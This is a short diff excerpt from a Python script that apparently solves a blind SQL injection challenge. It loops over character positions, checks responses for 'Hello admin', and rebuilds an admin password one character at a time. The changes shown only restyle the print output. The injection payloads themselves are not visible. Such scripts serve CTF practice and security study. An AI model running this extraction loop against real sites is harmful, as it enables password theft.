@@ -29,8 +29,8 @@ for x in range(0, 10):
     break
 
 print()    
-print(f"Payload: ?pw={payload}")
-print(f"Password length: {password_length}")
+print(f"[!] Payload: ?pw={payload}")
+print(f"[!] Password length: {password_length}")
 print()
 
 password = ""
@@ -46,13 +46,13 @@ for index in range(1, password_length + 1):
 
     if "Hello admin" in response.text:
       password += char
-      print(f"Payload: ?pw={payload}")
-      print(f"Character at index {index}: {char}")
+      print(f"[+] Payload: ?pw={payload}")
+      print(f"[+] Character at index {index}: {char}")
       break
 
 print()
-print(f"Extracted password: {password}")
-print(f"Final payload: ?pw={password}")
+print(f"[!] Extracted Password: {password}")
+print(f"[!] Final payload: ?pw={password}")
 ```
 
 ```
